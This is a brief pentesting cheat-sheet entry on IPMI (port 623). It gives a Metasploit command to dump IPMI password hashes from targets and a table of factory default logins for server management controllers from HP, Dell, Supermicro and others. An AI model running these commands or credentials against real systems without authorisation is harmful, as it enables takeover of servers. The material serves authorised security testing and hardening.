---
description: >-
  Intelligent Platform Management Interface (IPMI)  is a set of computer
  interface specifications for an autonomous computer subsystem that provides
  management and monitoring capabilities independently.
---

# 623 - IPMI

### Metasploit

```text
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts [TARGETS] 
run 
```

### Common default credentials

| Product Name  | Default Username  | Default Password  |
| :--- | :--- | :--- |
| HP Integrated Lights Out \(iLO\)  | Administrator  | &lt;factory randomized 8-character string&gt;  |
| Dell Remote Access Card \(iDRAC, DRAC\)  | root  | calvin  |
| IBM Integrated Management Module \(IMM\)  | USERID  | PASSW0RD \(with a zero\)  |
| Fujitsu Integrated Remote Management Controller  | admin  | admin  |
| Supermicro IPMI \(2.0\)  | ADMIN  | ADMIN  |
| Oracle/Sun Integrated Lights Out Manager \(ILOM\)  | root  | changeme  |
| ASUS iKVM BMC  | admin  | admin  |

Resources: 

[https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/) 

